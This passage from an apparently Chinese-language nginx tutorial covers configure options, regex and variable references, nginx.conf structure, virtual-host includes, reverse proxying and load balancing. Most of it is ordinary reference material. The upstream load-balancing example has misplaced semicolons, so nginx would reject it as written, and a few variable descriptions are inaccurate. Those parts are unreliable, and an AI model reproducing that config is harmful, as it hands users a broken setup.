nginx</span><br></pre></td></tr></table></figure><ul><li>编译安装，删除<code>/usr/local/nginx</code>目录即可</li><li>如果配置了自启动脚本，也需要删除。</li></ul><h2 id="五、参数说明"><a href="#五、参数说明" class="headerlink" title="五、参数说明"></a>五、参数说明</h2><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>–prefix=<code>&lt;path&gt;</code></td><td>Nginx安装路径。如果没有指定，默认为 /usr/local/nginx。</td></tr><tr><td>–sbin-path=<code>&lt;path&gt;</code></td><td>Nginx可执行文件安装路径。只能安装时指定，如果没有指定，默认为<code>&lt;prefix&gt;</code>/sbin/nginx。</td></tr><tr><td>–conf-path=<code>&lt;path&gt;</code></td><td>在没有给定-c选项下默认的nginx.conf的路径。如果没有指定，默认为<code>&lt;prefix&gt;</code>/conf/nginx.conf。</td></tr><tr><td>–pid-path=<code>&lt;path&gt;</code></td><td>在nginx.conf中没有指定pid指令的情况下，默认的nginx.pid的路径。如果没有指定，默认为 <code>&lt;prefix&gt;</code>/logs/nginx.pid。</td></tr><tr><td>–lock-path=<code>&lt;path&gt;</code></td><td>nginx.lock文件的路径。</td></tr><tr><td>–error-log-path=<code>&lt;path&gt;</code></td><td>在nginx.conf中没有指定error_log指令的情况下，默认的错误日志的路径。如果没有指定，默认为 <code>&lt;prefix&gt;</code>/- logs/error.log。</td></tr><tr><td>–http-log-path=<code>&lt;path&gt;</code></td><td>在nginx.conf中没有指定access_log指令的情况下，默认的访问日志的路径。如果没有指定，默认为 <code>&lt;prefix&gt;</code>/- logs/access.log。</td></tr><tr><td>–user=<code>&lt;user&gt;</code></td><td>在nginx.conf中没有指定user指令的情况下，默认的nginx使用的用户。如果没有指定，默认为 nobody。</td></tr><tr><td>–group=<code>&lt;group&gt;</code></td><td>在nginx.conf中没有指定user指令的情况下，默认的nginx使用的组。如果没有指定，默认为 nobody。</td></tr><tr><td>–builddir=DIR</td><td>指定编译的目录</td></tr><tr><td>–with-rtsig_module</td><td>启用 rtsig 模块</td></tr><tr><td>–with-select_module –without-select_module</td><td>允许或不允许开启SELECT模式，如果 configure 没有找到更合适的模式，比如：kqueue(sun os),epoll (linux kenel 2.6+), rtsig(- 实时信号)或者/dev/poll(一种类似select的模式，底层实现与SELECT基本相 同，都是采用轮训方法) SELECT模式将是默认安装模式</td></tr><tr><td>–with-poll_module –without-poll_module</td><td>Whether or not to enable the poll module. This module is enabled by, default if a more suitable method such as kqueue, epoll, rtsig or /dev/poll is not discovered by configure.</td></tr><tr><td>–with-http_ssl_module</td><td>Enable ngx_http_ssl_module. Enables SSL support and the ability to handle HTTPS requests. Requires OpenSSL. On Debian, this is libssl-dev. 开启HTTP SSL模块，使NGINX可以支持HTTPS请求。这个模块需要已经安装了OPENSSL，在DEBIAN上是libssl</td></tr><tr><td>–with-http_realip_module</td><td>启用 ngx_http_realip_module</td></tr><tr><td>–with-http_addition_module</td><td>启用 ngx_http_addition_module</td></tr><tr><td>–with-http_sub_module</td><td>启用 ngx_http_sub_module</td></tr><tr><td>–with-http_dav_module</td><td>启用 ngx_http_dav_module</td></tr><tr><td>–with-http_flv_module</td><td>启用 ngx_http_flv_module</td></tr><tr><td>–with-http_stub_status_module</td><td>启用 “server status” 页</td></tr><tr><td>–without-http_charset_module</td><td>禁用 ngx_http_charset_module</td></tr><tr><td>–without-http_gzip_module</td><td>禁用 ngx_http_gzip_module. 如果启用，需要 zlib 。</td></tr><tr><td>–without-http_ssi_module</td><td>禁用 ngx_http_ssi_module</td></tr><tr><td>–without-http_userid_module</td><td>禁用 ngx_http_userid_module</td></tr><tr><td>–without-http_access_module</td><td>禁用 ngx_http_access_module</td></tr><tr><td>–without-http_auth_basic_module</td><td>禁用 ngx_http_auth_basic_module</td></tr><tr><td>–without-http_autoindex_module</td><td>禁用 ngx_http_autoindex_module</td></tr><tr><td>–without-http_geo_module</td><td>禁用 ngx_http_geo_module</td></tr><tr><td>–without-http_map_module</td><td>禁用 ngx_http_map_module</td></tr><tr><td>–without-http_referer_module</td><td>禁用 ngx_http_referer_module</td></tr><tr><td>–without-http_rewrite_module</td><td>禁用 ngx_http_rewrite_module. 如果启用需要 PCRE 。</td></tr><tr><td>–without-http_proxy_module</td><td>禁用 ngx_http_proxy_module</td></tr><tr><td>–without-http_fastcgi_module</td><td>禁用 ngx_http_fastcgi_module</td></tr><tr><td>–without-http_memcached_module</td><td>禁用 ngx_http_memcached_module</td></tr><tr><td>–without-http_limit_zone_module</td><td>禁用 ngx_http_limit_zone_module</td></tr><tr><td>–without-http_empty_gif_module</td><td>禁用 ngx_http_empty_gif_module</td></tr><tr><td>–without-http_browser_module</td><td>禁用 ngx_http_browser_module</td></tr><tr><td>–without-http_upstream_ip_hash_module</td><td>禁用 ngx_http_upstream_ip_hash_module</td></tr><tr><td>–with-http_perl_module</td><td>启用 ngx_http_perl_module</td></tr><tr><td>–with-perl_modules_path=PATH</td><td>指定 perl 模块的路径</td></tr><tr><td>–with-perl=PATH</td><td>指定 perl 执行文件的路径</td></tr><tr><td>–http-log-path=PATH</td><td>Set path to the http access log</td></tr><tr><td>–http-client-body-temp-path=PATH</td><td>Set path to the http client request body temporary files</td></tr><tr><td>–http-proxy-temp-path=PATH</td><td>Set path to the http proxy temporary files</td></tr><tr><td>–http-fastcgi-temp-path=PATH</td><td>Set path to the http fastcgi temporary files</td></tr><tr><td>–without-http</td><td>禁用 HTTP server</td></tr><tr><td>–with-mail</td><td>启用 IMAP4/POP3/SMTP 代理模块</td></tr><tr><td>–with-mail_ssl_module</td><td>启用 ngx_mail_ssl_module</td></tr><tr><td>–with-cc=PATH</td><td>指定 C 编译器的路径</td></tr><tr><td>–with-cpp=PATH</td><td>指定 C 预处理器的路径</td></tr><tr><td>–with-cc-opt=OPTIONS</td><td>Additional parameters which will be added to the variable CFLAGS. With the use of the system library PCRE in FreeBSD, it is necessary to indicate –with-cc-opt=”-I /usr/local/include”. If we are using select() and it is necessary to increase the number of file descriptors, then this also can be assigned here: –with-cc-opt=”-D FD_SETSIZE=2048”.</td></tr><tr><td>–with-ld-opt=OPTIONS</td><td>Additional parameters passed to the linker. With the use of the system library PCRE in - FreeBSD, it is necessary to indicate –with-ld-opt=”-L /usr/local/lib”.</td></tr><tr><td>–with-cpu-opt=CPU</td><td>为特定的 CPU 编译，有效的值包括：pentium, pentiumpro, pentium3, pentium4, athlon, opteron, amd64, sparc32, sparc64, ppc64</td></tr><tr><td>–without-pcre</td><td>禁止 PCRE 库的使用。同时也会禁止 HTTP rewrite 模块。在 “location” 配置指令中的正则表达式也需要 PCRE 。</td></tr><tr><td>–with-pcre=DIR</td><td>指定 PCRE 库的源代码的路径。</td></tr><tr><td>–with-pcre-opt=OPTIONS</td><td>Set additional options for PCRE building.</td></tr><tr><td>–with-md5=DIR</td><td>Set path to md5 library sources.</td></tr><tr><td>–with-md5-opt=OPTIONS</td><td>Set additional options for md5 building.</td></tr><tr><td>–with-md5-asm</td><td>Use md5 assembler sources.</td></tr><tr><td>–with-sha1=DIR</td><td>Set path to sha1 library sources.</td></tr><tr><td>–with-sha1-opt=OPTIONS</td><td>Set additional options for sha1 building.</td></tr><tr><td>–with-sha1-asm</td><td>Use sha1 assembler sources.</td></tr><tr><td>–with-zlib=DIR</td><td>Set path to zlib library sources.</td></tr><tr><td>–with-zlib-opt=OPTIONS</td><td>Set additional options for zlib building.</td></tr><tr><td>–with-zlib-asm=CPU</td><td>Use zlib assembler sources optimized for specified CPU, valid values are: pentium, pentiumpro</td></tr><tr><td>–with-openssl=DIR</td><td>Set path to OpenSSL library sources</td></tr><tr><td>–with-openssl-opt=OPTIONS</td><td>Set additional options for OpenSSL building</td></tr><tr><td>–with-debug</td><td>启用调试日志</td></tr><tr><td>–add-module=PATH</td><td>Add in a third-party module found in directory PATH</td></tr></tbody></table><h2 id="六、配置"><a href="#六、配置" class="headerlink" title="六、配置"></a>六、配置</h2><ul><li>在<code>Centos</code> 默认配置文件在 <strong><code>/usr/local/nginx-1.5.1/conf/nginx.conf</code></strong> 我们要在这里配置一些文件。<code>nginx.conf</code>是主配置文件，由若干个部分组成，每个大括号<code>{}</code>表示一个部分。每一行指令都由分号结束<code>;</code>，标志着一行的结束。</li></ul><h3 id="6-1-常用正则"><a href="#6-1-常用正则" class="headerlink" title="6.1 常用正则"></a>6.1 常用正则</h3><table><thead><tr><th>正则</th><th>说明</th><th>正则</th><th>说明</th></tr></thead><tbody><tr><td><code>.</code></td><td>匹配除换行符以外的任意字符</td><td><code>$</code></td><td>匹配字符串的结束</td></tr><tr><td><code>?</code></td><td>重复0次或1次</td><td><code>{n}</code></td><td>重复n次</td></tr><tr><td><code>+</code></td><td>重复1次或更多次</td><td><code>{n,}</code></td><td>重复n次或更多次</td></tr><tr><td><code>*</code></td><td>重复0次或更多次</td><td><code>[c]</code></td><td>匹配单个字符c</td></tr><tr><td><code>\d</code></td><td>匹配数字</td><td><code>[a-z]</code></td><td>匹配a-z小写字母的任意一个</td></tr><tr><td><code>^</code></td><td>匹配字符串的开始</td><td>-</td><td>-</td></tr></tbody></table><h3 id="6-2-全局变量"><a href="#6-2-全局变量" class="headerlink" title="6.2 全局变量"></a>6.2 全局变量</h3><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td><code>$args</code></td><td>这个变量等于请求行中的参数，同<code>$query_string</code></td><td><code>$remote_port</code></td><td>客户端的端口。</td></tr><tr><td><code>$content_length</code></td><td>请求头中的<code>Content-length</code>字段。</td><td><code>$remote_user</code></td><td>已经经过<code>Auth Basic Module</code>验证的用户名。</td></tr><tr><td><code>$content_type</code></td><td>请求头中的<code>Content-Type</code>字段。</td><td><code>$request_filename</code></td><td>当前请求的文件路径，由<code>root</code>或<code>alias</code>指令与<code>URI</code>请求生成。</td></tr><tr><td><code>$document_root</code></td><td>当前请求在<code>root</code>指令中指定的值。</td><td><code>$scheme</code></td><td><code>HTTP</code>方法（如<code>http</code>，<code>https</code>）。</td></tr><tr><td><code>$host</code></td><td>请求主机头字段，否则为服务器名称。</td><td><code>$server_protocol</code></td><td>请求使用的协议，通常是<code>HTTP/1.0</code>或<code>HTTP/1.1</code>。</td></tr><tr><td><code>$http_user_agent</code></td><td>客户端<code>agent</code>信息</td><td><code>$server_addr</code></td><td>服务器地址，在完成一次系统调用后可以确定这个值。</td></tr><tr><td><code>$http_cookie</code></td><td>客户端<code>cookie</code>信息</td><td><code>$server_name</code></td><td>服务器名称。</td></tr><tr><td><code>$limit_rate</code></td><td>这个变量可以限制连接速率。</td><td><code>$server_port</code></td><td>请求到达服务器的端口号。</td></tr><tr><td><code>$request_method</code></td><td>客户端请求的动作，通常为<code>GET</code>或<code>POST</code>。</td><td><code>$request_uri</code></td><td>包含请求参数的原始<code>URI</code>，不包含主机名，如：<code>/foo/bar.php?arg=baz</code>。</td></tr><tr><td><code>$remote_addr</code></td><td>客户端的IP地址。</td><td><code>$uri</code></td><td>不带请求参数的当前<code>URI</code>，<code>$uri</code>不包含主机名，如<code>/foo/bar.html</code>。</td></tr><tr><td><code>$document_uri</code></td><td>与<code>$uri</code>相同。</td><td>-</td><td>-</td></tr></tbody></table><p>例如请求：<code>http://localhost:3000/test1/test2/test.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$host：localhost  </span><br><span class="line">$server_port：3000  </span><br><span class="line">$request_uri：/test1/test2/test.php  </span><br><span class="line">$document_uri：/test1/test2/test.php  </span><br><span class="line">$document_root：/var/www/html  </span><br><span class="line">$request_filename：/var/www/html/test1/test2/test.php</span><br></pre></td></tr></table></figure><h3 id="6-3-符号参考"><a href="#6-3-符号参考" class="headerlink" title="6.3 符号参考"></a>6.3 符号参考</h3><table><thead><tr><th>符号</th><th>说明</th><th>符号</th><th>说明</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td><code>k</code>,<code>K</code></td><td>千字节</td><td><code>m</code>,<code>M</code></td><td>兆字节</td><td><code>ms</code></td><td>毫秒</td></tr><tr><td><code>s</code></td><td>秒</td><td><code>m</code></td><td>分钟</td><td><code>h</code></td><td>小时</td></tr><tr><td><code>d</code></td><td>日</td><td><code>w</code></td><td>周</td><td><code>M</code></td><td>一个月, <code>30</code>天</td></tr></tbody></table><ul><li>例如，”8k”，”1m” 代表字节数计量。  </li><li>例如，”1h 30m”，”1y 6M”。代表 “1小时 30分”，”1年零6个月”。 </li></ul><h3 id="6-4-配置文件"><a href="#6-4-配置文件" class="headerlink" title="6.4 配置文件"></a>6.4 配置文件</h3><ul><li><code>nginx</code> 的配置系统由一个主配置文件和其他一些辅助的配置文件构成。这些配置文件均是纯文本文件，全部位于 <code>nginx</code> 安装目录下的 <code>conf</code> 目录下。</li><li>指令由 <code>nginx</code> 的各个模块提供，不同的模块会提供不同的指令来实现配置。<br>指令除了 <code>Key-Value</code> 的形式，还有作用域指令。</li><li><code>nginx.conf</code> 中的配置信息，根据其逻辑上的意义，对它们进行了分类，也就是分成了多个作用域，或者称之为配置指令上下文。不同的作用域含有一个或者多个配置项。</li></ul><blockquote><p>下面的这些上下文指令是用的比较多：</p></blockquote><table><thead><tr><th><code>Directive</code></th><th><code>Description</code></th><th><code>Contains Directive</code></th></tr></thead><tbody><tr><td><code>main</code></td><td><code>nginx</code> 在运行时与具体业务功能（比如 <code>http</code> 服务或者 <code>email</code>服务代理）无关的一些参数，比如工作进程数，运行的身份等。</td><td><code>user</code>, <code>worker_processes</code>, <code>error_log</code>, <code>events</code>, <code>http</code>, <code>mail</code></td></tr><tr><td><code>http</code></td><td>与提供 <code>http</code> 服务相关的一些配置参数。例如：是否使用 <code>keepalive</code>啊，是否使用<code>gzip</code> 进行压缩等。</td><td><code>server</code></td></tr><tr><td><code>server</code></td><td><code>http</code> 服务上支持若干虚拟主机。每个虚拟主机一个对应的 <code>server</code> 配置项，配置项里面包含该虚拟主机相关的配置。在提供 <code>mail</code> 服务的代理时，也可以建立若干 <code>server.</code> 每个 <code>server</code> 通过监听的地址来区分。</td><td><code>listen</code>, <code>server_name</code>,<code>access_log</code>, <code>location</code>, <code>protocol</code>, <code>proxy</code>, <code>smtp_auth</code>, <code>xclient</code></td></tr><tr><td><code>location</code></td><td><code>http</code> 服务中，某些特定的 <code>URL</code> 对应的一系列配置项。</td><td><code>index</code>, <code>root</code></td></tr><tr><td><code>mail</code></td><td>实现<code>email</code>相关的 <code>SMTP/IMAP/POP3</code> 代理时，共享的一些配置项（因为可能实现多个代理，工作在多个监听地址上）。</td><td><code>server</code>,<code>http</code>, <code>imap_capabilities</code></td></tr><tr><td><code>include</code></td><td>以便增强配置文件的可读性，使得部分配置文件可以重新使用。</td><td>-</td></tr><tr><td><code>valid_referers</code></td><td>用来校验<code>Http</code>请求头<code>Referer</code>是否有效。</td><td>-</td></tr><tr><td><code>try_files</code></td><td>用在<code>server</code>部分，不过最常见的还是用在<code>location</code>部分，它会按照给定的参数顺序进行尝试，第一个被匹配到的将会被使用。</td><td>-</td></tr><tr><td><code>if</code></td><td>当在<code>location</code>块中使用<code>if</code>指令，在某些情况下它并不按照预期运行，一般来说避免使用<code>if</code>指令。</td><td>-</td></tr></tbody></table><ul><li>例如我们再 <strong><code>nginx.conf</code></strong> 里面引用两个配置 <code>vhost/example.com.conf</code>和 <code>vhost/gitlab.com.conf</code> 它们都被放在一个我自己新建的目录 <code>vhost</code>下面。<code>nginx.conf</code> 配置如下：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">    <span class="comment">#                  '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">    <span class="comment">#                  '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">include</span>  vhost/example.com.conf;</span><br><span class="line">    <span class="attribute">include</span>  vhost/gitlab.com.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>简单的配置: <code>example.com.conf</code></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment">#侦听的80端口</span></span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  baidu.com app.baidu.com; <span class="comment"># 这里指定域名</span></span><br><span class="line">    <span class="attribute">index</span>        index.html index.htm;    <span class="comment"># 这里指定默认入口页面</span></span><br><span class="line">    <span class="attribute">root</span> /home/www/app.baidu.com;         <span class="comment"># 这里指定目录</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-5-内置预定义变量"><a href="#6-5-内置预定义变量" class="headerlink" title="6.5 内置预定义变量"></a>6.5 内置预定义变量</h3><ul><li><code>Nginx</code>提供了许多预定义的变量，也可以通过使用<code>set</code>来设置变量。你可以在<code>if</code>中使用预定义变量，也可以将它们传递给代理服务器。以下是一些常见的预定义变量，<a href="http://nginx.org/en/docs/varindex.html" target="_blank" rel="noopener">更多详见</a></li></ul><table><thead><tr><th>变量名称</th><th>值</th></tr></thead><tbody><tr><td><code>$args_name</code></td><td>在请求中的<code>name</code>参数</td></tr><tr><td><code>$args</code>  `</td><td>所有请求参数</td></tr><tr><td><code>$query_string</code></td><td><code>$args</code>的别名</td></tr><tr><td><code>$content_length</code></td><td>请求头<code>Content-Length</code>的值</td></tr><tr><td><code>$content_type</code></td><td>请求头<code>Content-Type</code>的值</td></tr><tr><td><code>$host</code></td><td>如果当前有<code>Host</code>，则为请求头<code>Host</code>的值；如果没有这个头，那么该值等于匹配该请求的<code>server_name</code>的值</td></tr><tr><td><code>$remote_addr</code></td><td>客户端的<code>IP</code>地址</td></tr><tr><td><code>$request</code></td><td>完整的请求，从客户端收到，包括<code>Http</code>请求方法、<code>URI</code>、<code>Http</code>协议、头、请求体</td></tr><tr><td><code>$request_uri</code></td><td>完整请求的<code>URI</code>，从客户端来的请求，包括参数</td></tr><tr><td><code>$scheme</code></td><td>当前请求的协议</td></tr><tr><td><code>$uri</code></td><td>当前请求的标准化<code>URI</code></td></tr></tbody></table><h3 id="6-6-反向代理"><a href="#6-6-反向代理" class="headerlink" title="6.6 反向代理"></a>6.6 反向代理</h3><ul><li>反向代理是一个<code>Web</code>服务器，它接受客户端的连接请求，然后将请求转发给上游服务器，并将从服务器得到的结果返回给连接的客户端。下面简单的反向代理的例子：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;  </span><br><span class="line">  <span class="attribute">listen</span>       <span class="number">80</span>;                                                        </span><br><span class="line">  <span class="attribute">server_name</span>  localhost;                                              </span><br><span class="line">  <span class="attribute">client_max_body_size</span> <span class="number">1024M</span>;  <span class="comment"># 允许客户端请求的最大单文件字节数</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span>                         http://localhost:8080;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host              <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For   <span class="variable">$remote_addr</span>; <span class="comment"># HTTP的请求端真实的IP</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;      <span class="comment"># 为了正确地识别实际用户发出的协议是 http 还是 https</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>复杂的配置: <code>gitlab.com.conf</code>。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment">#侦听的80端口</span></span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  git.example.cn;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://localhost:3000;</span><br><span class="line">        <span class="comment">#以下是一些反向代理的配置可删除</span></span><br><span class="line">        <span class="attribute">proxy_redirect</span>             <span class="literal">off</span>;</span><br><span class="line">        <span class="comment">#后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span>           Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span>       <span class="number">10m</span>; <span class="comment">#允许客户端请求的最大单文件字节数</span></span><br><span class="line">        <span class="attribute">client_body_buffer_size</span>    <span class="number">128k</span>; <span class="comment">#缓冲区代理缓冲用户端请求的最大字节数</span></span><br><span class="line">        <span class="attribute">proxy_connect_timeout</span>      <span class="number">300</span>; <span class="comment">#nginx跟后端服务器连接超时时间(代理连接超时)</span></span><br><span class="line">        <span class="attribute">proxy_send_timeout</span>         <span class="number">300</span>; <span class="comment">#后端服务器数据回传时间(代理发送超时)</span></span><br><span class="line">        <span class="attribute">proxy_read_timeout</span>         <span class="number">300</span>; <span class="comment">#连接成功后，后端服务器响应时间(代理接收超时)</span></span><br><span class="line">        <span class="attribute">proxy_buffer_size</span>          <span class="number">4k</span>; <span class="comment">#设置代理服务器（nginx）保存用户头信息的缓冲区大小</span></span><br><span class="line">        <span class="attribute">proxy_buffers</span>              <span class="number">4</span> <span class="number">32k</span>; <span class="comment">#proxy_buffers缓冲区，网页平均在32k以下的话，这样设置</span></span><br><span class="line">        <span class="attribute">proxy_busy_buffers_size</span>    <span class="number">64k</span>; <span class="comment">#高负荷下缓冲大小（proxy_buffers*2）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>代理到上游服务器的配置中，最重要的是<code>proxy_pass</code>指令。以下是代理模块中的一些常用指令：</li></ul><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td><code>proxy_connect_timeout</code></td><td><code>Nginx</code>从接受请求至连接到上游服务器的最长等待时间</td></tr><tr><td><code>proxy_send_timeout</code></td><td>后端服务器数据回传时间(代理发送超时)</td></tr><tr><td><code>proxy_read_timeout</code></td><td>连接成功后，后端服务器响应时间(代理接收超时)</td></tr><tr><td><code>proxy_cookie_domain</code></td><td>替代从上游服务器来的<code>Set-Cookie</code>头的<code>domain</code>属性</td></tr><tr><td><code>proxy_cookie_path</code></td><td>替代从上游服务器来的<code>Set-Cookie</code>头的<code>path</code>属性</td></tr><tr><td><code>proxy_buffer_size</code></td><td>设置代理服务器（<code>nginx</code>）保存用户头信息的缓冲区大小</td></tr><tr><td><code>proxy_buffers</code></td><td><code>proxy_buffers</code>缓冲区，网页平均在多少k以下</td></tr><tr><td><code>proxy_set_header</code></td><td>重写发送到上游服务器头的内容，也可以通过将某个头部的值设置为空字符串，而不发送某个头部的方法实现</td></tr><tr><td><code>proxy_ignore_headers</code></td><td>这个指令禁止处理来自代理服务器的应答。</td></tr><tr><td><code>proxy_intercept_errors</code></td><td>使<code>nginx</code>阻止<code>HTTP</code>应答代码为<code>400</code>或者更高的应答。</td></tr></tbody></table><h3 id="6-7-负载均衡"><a href="#6-7-负载均衡" class="headerlink" title="6.7 负载均衡"></a>6.7 负载均衡</h3><ul><li><code>upstream</code>指令启用一个新的配置区段，在该区段定义一组上游服务器。这些服务器可能被设置不同的权重，也可能出于对服务器进行维护，标记为<code>down</code>。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> gitlab &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    <span class="comment"># upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.122.11:8081</span> ;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:82</span> weight=<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:83</span> weight=<span class="number">3</span> down;</span><br><span class="line">    server 127.0.0.1:84 weight=3; max_fails=3  fail_timeout=20s;</span><br><span class="line">    server 127.0.0.1:85 weight=4;;</span><br><span class="line">    <span class="attribute">keepalive</span> <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment">#侦听的80端口</span></span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  git.example.cn;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://gitlab;    <span class="comment">#在这里设置一个代理，和upstream的名字一样</span></span><br><span class="line">        <span class="comment">#以下是一些反向代理的配置可删除</span></span><br><span class="line">        <span class="attribute">proxy_redirect</span>             <span class="literal">off</span>;</span><br><span class="line">        <span class="comment">#后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span>           Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span>           X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span>           X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span>       <span class="number">10m</span>;  <span class="comment">#允许客户端请求的最大单文件字节数</span></span><br><span class="line">        <span class="attribute">client_body_buffer_size</span>    <span class="number">128k</span>; <span 